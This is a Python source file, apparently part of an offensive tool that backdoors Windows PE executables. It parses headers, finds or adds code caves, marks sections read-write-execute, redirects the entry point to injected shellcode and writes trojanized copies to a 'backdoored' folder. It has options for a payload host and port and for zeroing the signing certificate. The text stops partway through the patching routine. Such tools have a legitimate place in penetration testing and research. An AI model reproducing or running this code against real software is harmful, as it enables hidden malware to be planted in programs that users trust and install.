'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com

    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

import sys
import os
import struct
import shutil
import platform
import stat
import time
import subprocess
import pefile
from random import choice
from intel.intelCore import intelCore
from intel.intelmodules import eat_code_caves
from intel.WinIntelPE32 import winI32_shellcode
from intel.WinIntelPE64 import winI64_shellcode


MachineTypes = {'0x0': 'AnyMachineType',
                '0x1d3': 'Matsushita AM33',
                '0x8664': 'x64',
                '0x1c0': 'ARM LE',
                '0x1c4': 'ARMv7',
                '0xaa64': 'ARMv8 x64',
                '0xebc': 'EFIByteCode',
                '0x14c': 'Intel x86',
                '0x200': 'Intel Itanium',
                '0x9041': 'M32R',
                '0x266': 'MIPS16',
                '0x366': 'MIPS w/FPU',
                '0x466': 'MIPS16 w/FPU',
                '0x1f0': 'PowerPC LE',
                '0x1f1': 'PowerPC w/FP',
                '0x166': 'MIPS LE',
                '0x1a2': 'Hitachi SH3',
                '0x1a3': 'Hitachi SH3 DSP',
                '0x1a6': 'Hitachi SH4',
                '0x1a8': 'Hitachi SH5',
                '0x1c2': 'ARM or Thumb -interworking',
                '0x169': 'MIPS little-endian WCE v2'
                }

#What is supported:
supported_types = ['Intel x86', 'x64']


class pebin():
    """
    This is the pe binary class.  PE files get fed in, stuff is checked, and patching happens.
    """
    def __init__(self, FILE, OUTPUT, SHELL, NSECTION='sdata', DISK_OFFSET=0, ADD_SECTION=False,
                 CAVE_JUMPING=False, PORT=8888, HOST="127.0.0.1", SUPPLIED_SHELLCODE=None,
                 INJECTOR=False, CHANGE_ACCESS=True, VERBOSE=False, SUPPORT_CHECK=False,
                 SHELL_LEN=300, FIND_CAVES=False, SUFFIX=".old", DELETE_ORIGINAL=False, CAVE_MINER=False,
                 IMAGE_TYPE="ALL", ZERO_CERT=True, CHECK_ADMIN=False, PATCH_DLL=True):
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.SHELL = SHELL
        self.NSECTION = NSECTION
        self.DISK_OFFSET = DISK_OFFSET
        self.ADD_SECTION = ADD_SECTION
        self.CAVE_JUMPING = CAVE_JUMPING
        self.PORT = PORT
        self.HOST = HOST
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.INJECTOR = INJECTOR
        self.CHANGE_ACCESS = CHANGE_ACCESS
        self.VERBOSE = VERBOSE
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.SHELL_LEN = SHELL_LEN
        self.FIND_CAVES = FIND_CAVES
        self.SUFFIX = SUFFIX
        self.DELETE_ORIGINAL = DELETE_ORIGINAL
        self.CAVE_MINER = CAVE_MINER
        self.IMAGE_TYPE = IMAGE_TYPE
        self.ZERO_CERT = ZERO_CERT
        self.CHECK_ADMIN = CHECK_ADMIN
        self.PATCH_DLL = PATCH_DLL
        self.flItms = {}

    def run_this(self):
        if self.INJECTOR is True:
            self.injector()
            sys.exit()
        if self.FIND_CAVES is True:
            issupported = self.support_check()
            if issupported is False:
                print self.FILE, "is not supported."
                return False
            print ("Looking for caves with a size of %s bytes (measured as an integer" % self.SHELL_LEN)
            self.find_all_caves()
            return True
        if self.SUPPORT_CHECK is True:
            if not self.FILE:
                print "You must provide a file to see if it is supported (-f)"
                return False
            try:
                is_supported = self.support_check()
            except Exception, e:
                is_supported = False
                print 'Exception:', str(e), '%s' % self.FILE
            if is_supported is False:
                print "%s is not supported." % self.FILE
                return False
            else:
                print "%s is supported." % self.FILE
                return True

        self.output_options()
        return self.patch_pe()

    def gather_file_info_win(self):
        """
        Gathers necessary PE header information to backdoor
        a file and returns a dict of file information called flItms
        """
        #To do:
        #   verify signed vs unsigned
        #   map all headers
        #   map offset once the magic field is determined of 32+/32

        self.binary.seek(int('3C', 16))
        print "[*] Gathering file info"
        self.flItms['filename'] = self.FILE
        self.flItms['buffer'] = 0
        self.flItms['JMPtoCodeAddress'] = 0
        self.flItms['LocOfEntryinCode_Offset'] = self.DISK_OFFSET
        #---!!!! This will need to change for x64 !!!!
        #not so sure now..
        self.flItms['dis_frm_pehdrs_sectble'] = 248
        self.flItms['pe_header_location'] = struct.unpack('<i', self.binary.read(4))[0]
        # Start of COFF
        self.flItms['COFF_Start'] = self.flItms['pe_header_location'] + 4
        self.binary.seek(self.flItms['COFF_Start'])
        self.flItms['MachineType'] = struct.unpack('<H', self.binary.read(2))[0]
        if self.VERBOSE is True:
            for mactype, name in MachineTypes.iteritems():
                if int(mactype, 16) == self.flItms['MachineType']:
                        print 'MachineType is:', name
        #self.binary.seek(self.flItms['BoundImportLocation'])
        #self.flItms['BoundImportLOCinCode'] = struct.unpack('<I', self.binary.read(4))[0]
        self.binary.seek(self.flItms['COFF_Start'] + 2, 0)
        self.flItms['NumberOfSections'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['TimeDateStamp'] = struct.unpack('<I', self.binary.read(4))[0]
        self.binary.seek(self.flItms['COFF_Start'] + 16, 0)
        self.flItms['SizeOfOptionalHeader'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['Characteristics'] = struct.unpack('<H', self.binary.read(2))[0]
        #End of COFF
        self.flItms['OptionalHeader_start'] = self.flItms['COFF_Start'] + 20

        #if self.flItms['SizeOfOptionalHeader']:
            #Begin Standard Fields section of Optional Header
        self.binary.seek(self.flItms['OptionalHeader_start'])
        self.flItms['Magic'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MajorLinkerVersion'] = struct.unpack("!B", self.binary.read(1))[0]
        self.flItms['MinorLinkerVersion'] = struct.unpack("!B", self.binary.read(1))[0]
        self.flItms['SizeOfCode'] = struct.unpack("<I", self.binary.read(4))[0]
        self.flItms['SizeOfInitializedData'] = struct.unpack("<I", self.binary.read(4))[0]
        self.flItms['SizeOfUninitializedData'] = struct.unpack("<I",
                                                               self.binary.read(4))[0]
        self.flItms['AddressOfEntryPoint'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['BaseOfCode'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'Magic', self.flItms['Magic']
        if self.flItms['Magic'] != int('20B', 16):
            #print 'Not 0x20B!'
            self.flItms['BaseOfData'] = struct.unpack('<I', self.binary.read(4))[0]
        # End Standard Fields section of Optional Header
        # Begin Windows-Specific Fields of Optional Header
        if self.flItms['Magic'] == int('20B', 16):
            #print 'x64!'
            self.flItms['ImageBase'] = struct.unpack('<Q', self.binary.read(8))[0]
        else:
            self.flItms['ImageBase'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'self.flItms[ImageBase]', hex(self.flItms['ImageBase'])
        self.flItms['SectionAlignment'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['FileAlignment'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['MajorOperatingSystemVersion'] = struct.unpack('<H',
                                                                   self.binary.read(2))[0]
        self.flItms['MinorOperatingSystemVersion'] = struct.unpack('<H',
                                                                   self.binary.read(2))[0]
        self.flItms['MajorImageVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MinorImageVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MajorSubsystemVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MinorSubsystemVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['Win32VersionValue'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['SizeOfImageLoc'] = self.binary.tell()
        self.flItms['SizeOfImage'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['SizeOfHeaders'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['CheckSum'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['Subsystem'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['DllCharacteristics'] = struct.unpack('<H', self.binary.read(2))[0]
        if self.flItms['Magic'] == int('20B', 16):
            self.flItms['SizeOfStackReserve'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfStackCommit'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfHeapReserve'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfHeapCommit'] = struct.unpack('<Q', self.binary.read(8))[0]

        else:
            self.flItms['SizeOfStackReserve'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfStackCommit'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfHeapReserve'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfHeapCommit'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoaderFlags'] = struct.unpack('<I', self.binary.read(4))[0]  # zero
        self.flItms['NumberofRvaAndSizes'] = struct.unpack('<I', self.binary.read(4))[0]
        # End Windows-Specific Fields of Optional Header
        # Begin Data Directories of Optional Header
        self.flItms['ExportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ImportTableLOCInPEOptHdrs'] = self.binary.tell()
        self.flItms['ImportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ResourceTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ExceptionTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['CertTableLOC'] = self.binary.tell()
        self.flItms['CertificateTable'] = struct.unpack('<Q', self.binary.read(8))[0]

        self.flItms['BaseReLocationTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Debug'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Architecutre'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
        self.flItms['GlobalPrt'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['TLS Table'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['LoadConfigTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['BoundImportLocation'] = self.binary.tell()
        #print 'BoundImportLocation', hex(self.flItms['BoundImportLocation'])
        self.flItms['BoundImport'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.binary.seek(self.flItms['BoundImportLocation'])
        self.flItms['BoundImportLOCinCode'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'first IATLOCIN CODE', hex(self.flItms['BoundImportLOCinCode'])
        self.flItms['BoundImportSize'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'BoundImportSize', hex(self.flItms['BoundImportSize'])
        self.flItms['IAT'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['DelayImportDesc'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['CLRRuntimeHeader'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Reserved'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
        self.flItms['BeginSections'] = self.binary.tell()

        if self.flItms['NumberOfSections'] is not 0:

            self.flItms['Sections'] = []
            for section in range(self.flItms['NumberOfSections']):
                sectionValues = []
                sectionValues.append(self.binary.read(8))
                # VirtualSize
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # VirtualAddress
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # SizeOfRawData
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToRawData
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToRelocations
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToLinenumbers
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # NumberOfRelocations
                sectionValues.append(struct.unpack('<H', self.binary.read(2))[0])
                # NumberOfLinenumbers
                sectionValues.append(struct.unpack('<H', self.binary.read(2))[0])
                # SectionFlags
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                self.flItms['Sections'].append(sectionValues)
                if 'UPX'.lower() in sectionValues[0].lower():
                    print "UPX files not supported."
                    return False
                if ('.text\x00\x00\x00' == sectionValues[0] or
                   'AUTO\x00\x00\x00\x00' == sectionValues[0] or
                   'CODE\x00\x00\x00\x00' == sectionValues[0]):
                    self.flItms['textSectionName'] = sectionValues[0]
                    self.flItms['textVirtualAddress'] = sectionValues[2]
                    self.flItms['textPointerToRawData'] = sectionValues[4]
                elif '.rsrc\x00\x00\x00' == sectionValues[0]:
                    self.flItms['rsrcSectionName'] = sectionValues[0]
                    self.flItms['rsrcVirtualAddress'] = sectionValues[2]
                    self.flItms['rsrcSizeRawData'] = sectionValues[3]
                    self.flItms['rsrcPointerToRawData'] = sectionValues[4]
            self.flItms['VirtualAddress'] = self.flItms['SizeOfImage']

            self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                               self.flItms['textVirtualAddress'] +
                                               self.flItms['textPointerToRawData'] +
                                               self.flItms['LocOfEntryinCode_Offset'])

        else:
            self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                               self.flItms['LocOfEntryinCode_Offset'])

        self.flItms['VrtStrtngPnt'] = (self.flItms['AddressOfEntryPoint'] +
                                       self.flItms['ImageBase'])
        self.binary.seek(self.flItms['BoundImportLOCinCode'])
        self.flItms['ImportTableALL'] = self.binary.read(self.flItms['BoundImportSize'])
        self.flItms['NewIATLoc'] = self.flItms['BoundImportLOCinCode'] + 40

        ####################################
        #### Parse imports via pefile ######
        self.binary.seek(0)
        pe = pefile.PE(self.FILE, fast_load=True)
        #pe = pefile.PE(data=self.binary)
        pe.parse_data_directories()

        try:
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                #print entry.dll
                for imp in entry.imports:
                    #print imp.name
                    #print "\t", imp.name
                    if imp.name is None:
                        continue
                    if imp.name.lower() == 'loadlibrarya':
                        self.flItms['LoadLibraryAOffset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
                        self.flItms['LoadLibraryA'] = imp.address
                    if imp.name.lower() == 'getprocaddress':
                        self.flItms['GetProcAddressOffset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
                        self.flItms['GetProcAddress'] = imp.address
                    ''' #save for later use
                    if imp.name.lower() == 'createprocessa':
                        print imp.name, hex(imp.address)

                    if imp.name.lower() == 'waitforsingleobject':
                        print imp.name, hex(imp.address)

                    if imp.name.lower() == 'virtualalloc':
                        print imp.name, hex(imp.address)

                    if imp.name.lower() == 'connect':
                        print imp.name, hex(imp.address)

                    if imp.name.lower() == 'createthread':
                        print imp.name, hex(imp.address)
                    '''
        except Exception as e:
            print "Exception:", str(e)

        #####################################

    def print_flItms(self, flItms):

        keys = self.flItms.keys()
        keys.sort()
        for item in keys:
            if type(self.flItms[item]) == int:
                print item + ':', hex(self.flItms[item])
            elif item == 'Sections':
                print "-" * 50
                for section in self.flItms['Sections']:
                    print "Section Name", section[0]
                    print "Virutal Size", hex(section[1])
                    print "Virtual Address", hex(section[2])
                    print "SizeOfRawData", hex(section[3])
                    print "PointerToRawData", hex(section[4])
                    print "PointerToRelocations", hex(section[5])
                    print "PointerToLinenumbers", hex(section[6])
                    print "NumberOfRelocations", hex(section[7])
                    print "NumberOfLinenumbers", hex(section[8])
                    print "SectionFlags", hex(section[9])
                    print "-" * 50
            else:
                print item + ':', self.flItms[item]
        print "*" * 50, "END flItms"

    def change_section_flags(self, section):
        """
        Changes the user selected section to RWE for successful execution
        """
        print "[*] Changing Section Flags"
        self.flItms['newSectionFlags'] = int('e00000e0', 16)
        self.binary.seek(self.flItms['BeginSections'], 0)
        for _ in range(self.flItms['NumberOfSections']):
            sec_name = self.binary.read(8)
            if section in sec_name:
                self.binary.seek(28, 1)
                self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))
                return
            else:
                self.binary.seek(32, 1)

    def create_code_cave(self):
        """
        This function creates a code cave for shellcode to hide,
        takes in the dict from gather_file_info_win function and
        writes to the file and returns flItms
        """
        print "[*] Creating Code Cave"
        self.flItms['NewSectionSize'] = len(self.flItms['shellcode']) + 250  # bytes
        self.flItms['SectionName'] = self.NSECTION  # less than 7 chars
        self.flItms['filesize'] = os.stat(self.flItms['filename']).st_size
        self.flItms['newSectionPointerToRawData'] = self.flItms['filesize']
        self.flItms['VirtualSize'] = int(str(self.flItms['NewSectionSize']), 16)
        self.flItms['SizeOfRawData'] = self.flItms['VirtualSize']
        self.flItms['NewSectionName'] = "." + self.flItms['SectionName']
        self.flItms['newSectionFlags'] = int('e00000e0', 16)
        self.binary.seek(self.flItms['pe_header_location'] + 6, 0)
        self.binary.write(struct.pack('<h', self.flItms['NumberOfSections'] + 1))
        self.binary.seek(self.flItms['SizeOfImageLoc'], 0)
        self.flItms['NewSizeOfImage'] = (self.flItms['VirtualSize'] +
                                         self.flItms['SizeOfImage'])
        self.binary.write(struct.pack('<I', self.flItms['NewSizeOfImage']))
        self.binary.seek(self.flItms['BoundImportLocation'])
        if self.flItms['BoundImportLOCinCode'] != 0:
            self.binary.write(struct.pack('=i', self.flItms['BoundImportLOCinCode'] + 40))
        self.binary.seek(self.flItms['BeginSections'] +
                         40 * self.flItms['NumberOfSections'], 0)
        self.binary.write(self.flItms['NewSectionName'] +
                          "\x00" * (8 - len(self.flItms['NewSectionName'])))
        self.binary.write(struct.pack('<I', self.flItms['VirtualSize']))
        self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))
        self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))
        self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))
        if self.VERBOSE is True:
            print 'New Section PointerToRawData'
            print self.flItms['newSectionPointerToRawData']
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))
        self.binary.write(self.flItms['ImportTableALL'])
        self.binary.seek(self.flItms['filesize'] + 1, 0)  # moving to end of file
        nop = choice(intelCore.nops)
        if nop > 144:
            self.binary.write(struct.pack('!H', nop) * (self.flItms['VirtualSize'] / 2))
        else:
            self.binary.write(struct.pack('!B', nop) * (self.flItms['VirtualSize']))
        self.flItms['CodeCaveVirtualAddress'] = (self.flItms['SizeOfImage'] +
                                                 self.flItms['ImageBase'])
        self.flItms['buffer'] = int('200', 16)  # bytes
        self.flItms['JMPtoCodeAddress'] = (self.flItms['CodeCaveVirtualAddress'] -
                                           self.flItms['AddressOfEntryPoint'] -
                                           self.flItms['ImageBase'] - 5 +
                                           self.flItms['buffer'])

    def find_all_caves(self):
        """
        This function finds all the codecaves in a inputed file.
        Prints results to screen
        """

        print "[*] Looking for caves"
        SIZE_CAVE_TO_FIND = self.SHELL_LEN
        BeginCave = 0
        Tracking = 0
        count = 1
        caveTracker = []
        caveSpecs = []
        self.binary = open(self.FILE, 'r+b')
        self.binary.seek(0)
        while True:
            try:
                s = struct.unpack("<b", self.binary.read(1))[0]
            except Exception as e:
                #print str(e)
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1

        for caves in caveTracker:
            for section in self.flItms['Sections']:
                sectionFound = False
                if caves[0] >= section[4] and caves[1] <= (section[3] + section[4]) and \
                        caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                    print "We have a winner:", section[0]
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print 'SizeOfRawData', hex(section[3])
                    print 'PointerToRawData', hex(section[4])
                    print 'End of Raw Data:', hex(section[3] + section[4])
                    print '*' * 50
                    sectionFound = True
                    break
            if sectionFound is False:
                try:
                    print "No section"
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print '*' * 50
                except Exception as e:
                    print str(e)
        print "[*] Total of %s caves found" % len(caveTracker)
        self.binary.close()

    def find_cave(self):
        """This function finds all code caves, allowing the user
        to pick the cave for injecting shellcode."""

        len_allshells = ()
        if self.flItms['cave_jumping'] is True:
            for item in self.flItms['allshells']:
                len_allshells += (len(item), )
            len_allshells += (len(self.flItms['resumeExe']), )
            SIZE_CAVE_TO_FIND = sorted(len_allshells)[0]
        else:
            SIZE_CAVE_TO_FIND = self.flItms['shellcode_length']
            len_allshells = (self.flItms['shellcode_length'], )

        print "[*] Looking for caves that will fit the minimum "\
              "shellcode length of %s" % SIZE_CAVE_TO_FIND
        print "[*] All caves lengths: ", len_allshells
        Tracking = 0
        count = 1
        #BeginCave=0
        caveTracker = []
        caveSpecs = []

        self.binary.seek(0)

        while True:
            try:
                s = struct.unpack("<b", self.binary.read(1))[0]
            except:     # Exception as e:
                #print "CODE CAVE", str(e)
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1

        pickACave = {}

        for i, caves in enumerate(caveTracker):
            i += 1
            for section in self.flItms['Sections']:
                sectionFound = False
                try:
                    if caves[0] >= section[4] and \
                       caves[1] <= (section[3] + section[4]) and \
                       caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                        if self.VERBOSE is True:
                            print "Inserting code in this section:", section[0]
                            print '->Begin Cave', hex(caves[0])
                            print '->End of Cave', hex(caves[1])
                            print 'Size of Cave (int)', caves[1] - caves[0]
                            print 'SizeOfRawData', hex(section[3])
                            print 'PointerToRawData', hex(section[4])
                            print 'End of Raw Data:', hex(section[3] + section[4])
                            print '*' * 50
                        JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                            5 - self.flItms['AddressOfEntryPoint'])

                        sectionFound = True
                        pickACave[i] = [section[0], hex(caves[0]), hex(caves[1]),
                                        caves[1] - caves[0], hex(section[4]),
                                        hex(section[3] + section[4]), JMPtoCodeAddress]
                        break
                except:
                    print "-End of File Found.."
                    break
                if sectionFound is False:
                    if self.VERBOSE is True:
                        print "No section"
                        print '->Begin Cave', hex(caves[0])
                        print '->End of Cave', hex(caves[1])
                        print 'Size of Cave (int)', caves[1] - caves[0]
                        print '*' * 50

                JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                    5 - self.flItms['AddressOfEntryPoint'])
                try:
                    pickACave[i] = [None, hex(caves[0]), hex(caves[1]),
                                    caves[1] - caves[0], None,
                                    None, JMPtoCodeAddress]
                except:
                    print "EOF"

        print ("############################################################\n"
               "The following caves can be used to inject code and possibly\n"
               "continue execution.\n"
               "**Don't like what you see? Use jump, single, append, or ignore.**\n"
               "############################################################")

        CavesPicked = {}

        for k, item in enumerate(len_allshells):
            print "[*] Cave {0} length as int: {1}".format(k + 1, item)
            print "[*] Available caves: "

            for ref, details in pickACave.iteritems():
                if details[3] >= item:
                    print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
                                           "End: {5}; Cave begin: {1} End: {2}; "
                                           "Cave Size: {3}".format(details[0], details[1], details[2],
                                                                   details[3], details[4], details[5],
                                                                   details[6]))

            while True:
                try:
                    self.CAVE_MINER_TRACKER
                except:
                    self.CAVE_MINER_TRACKER = 0

                print "*" * 50
                selection = raw_input("[!] Enter your selection: ")
                try:
                    selection = int(selection)

                    print "[!] Using selection: %s" % selection
                    try:
                        if self.CHANGE_ACCESS is True:
                            if pickACave[selection][0] is not None:
                                self.change_section_flags(pickACave[selection][0])
                        CavesPicked[k] = pickACave[selection]
                        break
                    except:
                        print "[!!!!] User selection beyond the bounds of available caves."
                        print "[!!!!] Try a number or the following commands:"
                        print "[!!!!] append or a, jump or j, ignore or i, single or s"
                        print "[!!!!] TRY AGAIN."
                        continue
                except:
                    pass
                breakOutValues = ['append', 'jump', 'single', 'ignore', 'a', 'j', 's', 'i']
                if selection.lower() in breakOutValues:
                    return selection
        return CavesPicked

    def runas_admin(self):
        """
        This module jumps to .rsrc section and checks for
        the following string: requestedExecutionLevel level="highestAvailable"

        """
        #g = open(flItms['filename'], "rb")
        runas_admin = False
        print "[*] Checking Runas_admin"
        if 'rsrcPointerToRawData' in self.flItms:
            self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
            search_lngth = len('requestedExecutionLevel level="highestAvailable"')
            data_read = 0
            while data_read < self.flItms['rsrcSizeRawData']:
                self.binary.seek(self.flItms['rsrcPointerToRawData'] + data_read, 0)
                temp_data = self.binary.read(search_lngth)
                if temp_data == 'requestedExecutionLevel level="highestAvailable"':
                    runas_admin = True
                    break
                data_read += 1
        if runas_admin is True:
            print "[*] %s must run with highest available privileges" % self.FILE
        else:
            print "[*] %s does not require highest available privileges" % self.FILE

        return runas_admin

    def support_check(self):
        """
        This function is for checking if the current exe/dll is
        supported by this program. Returns false if not supported,
        returns flItms if it is.
        """
        print "[*] Checking if binary is supported"
        self.flItms['supported'] = False
        #global f
        self.binary = open(self.FILE, "r+b")
        if self.binary.read(2) != "\x4d\x5a":
            print "%s not a PE File" % self.FILE
            return False
        self.gather_file_info_win()
        if self.flItms is False:
            return False
        if MachineTypes[hex(self.flItms['MachineType'])] not in supported_types:
            for item in self.flItms:
                print item + ':', self.flItms[item]
            print ("This program does not support this format: %s"
                   % MachineTypes[hex(self.flItms['MachineType'])])
        else:
            self.flItms['supported'] = True
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)

        if self.flItms['Characteristics'] - 0x2000 > 0 and self.PATCH_DLL is False:
            return False

        if self.flItms['Magic'] == int('20B', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
            #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64':
            self.flItms, self.flItms['count_bytes'] = targetFile.pe64_entry_instr()
        elif self.flItms['Magic'] == int('10b', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):
            #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32':
            self.flItms, self.flItms['count_bytes'] = targetFile.pe32_entry_instr()
        else:
            self.flItms['supported'] = False

        #This speeds things up, MAKE IT OPTIONAL
        #CONFIG
        if self.CHECK_ADMIN is True:
            self.flItms['runas_admin'] = self.runas_admin()

        if self.VERBOSE is True:
            self.print_flItms(self.flItms)

        if self.flItms['supported'] is False:
            return False

        self.binary.close()

    def patch_pe(self):

        """
        This function operates the sequence of all involved
        functions to perform the binary patching.
        """
        print "[*] In the backdoor module"
        if self.INJECTOR is False:
            os_name = os.name
            if not os.path.exists("backdoored"):
                os.makedirs("backdoored")
            if os_name == 'nt':
                self.OUTPUT = "backdoored\\" + self.OUTPUT
            else:
                self.OUTPUT = "backdoored/" + self.OUTPUT

        issupported = self.support_check()

        if issupported is False:
            return None

        self.flItms['NewCodeCave'] = self.ADD_SECTION
        self.flItms['cave_jumping'] = self.CAVE_JUMPING
        self.flItms['CavesPicked'] = {}
        self.flItms['LastCaveAddress'] = 0
        self.flItms['stager'] = False
        self.flItms['supplied_shellcode'] = self.SUPPLIED_SHELLCODE

        theResult = self.set_shells()

        if theResult is False or self.flItms['allshells'] is False:
            return False

        #Creating file to backdoor
        self.flItms['backdoorfile'] = self.OUTPUT
        shutil.copy2(self.FILE, self.flItms['backdoorfile'])

        self.binary = open(self.flItms['backdoorfile'], "r+b")
        #reserve space for shellcode
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
        # Finding the length of the resume Exe shellcode
        if self.flItms['Magic'] == int('20B', 16):
            _, self.flItms['resumeExe'] = targetFile.resume_execution_64()
        else:
            _, self.flItms['resumeExe'] = targetFile.resume_execution_32()

        shellcode_length = len(self.flItms['shellcode'])

        self.flItms['shellcode_length'] = shellcode_length + len(self.flItms['resumeExe'])

        caves_set = False
        while caves_set is False and self.flItms['NewCodeCave'] is False:
            #if self.flItms['NewCodeCave'] is False:
                #self.flItms['JMPtoCodeAddress'], self.flItms['CodeCaveLOC'] = (
            self.flItms['CavesPicked'] = self.find_cave()
            if type(self.flItms['CavesPicked']) == str:
                if self.flItms['CavesPicked'].lower() in ['append', 'a']:
                    self.flItms['JMPtoCodeAddress'] = None
                    self.flItms['CodeCaveLOC'] = 0
                    self.flItms['cave_jumping'] = False
                    self.flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    self.set_shells()
                    caves_set = True
                elif self.flItms['CavesPicked'].lower() in ['jump', 'j']:
                    self.flItms['JMPtoCodeAddress'] = None
                    self.flItms['CodeCaveLOC'] = 0
                    self.flItms['cave_jumping'] = True
                    self.flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    self.set_shells()
                    continue
                elif self.flItms['CavesPicked'].lower() in ['single', 's']:
                    self.flItms['JMPtoCodeAddress'] = None
                    self.flItms['CodeCaveLOC'] = 0
                    self.flItms['cave_jumping'] = False
                    self.flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    self.set_shells()
                    continue
                elif self.flItms['CavesPicked'].lower() in ['ignore', 'i']:
                    #Let's say we don't want to patch a binary
                    return None
            elif self.flItms['CavesPicked'] is None:
                return None
            else:
                self.flItms['JMPtoCodeAddress'] = self.flItms['CavesPicked'].iteritems().next()[1][6]
                caves_set = True
            #else:
            #    caves_set = True

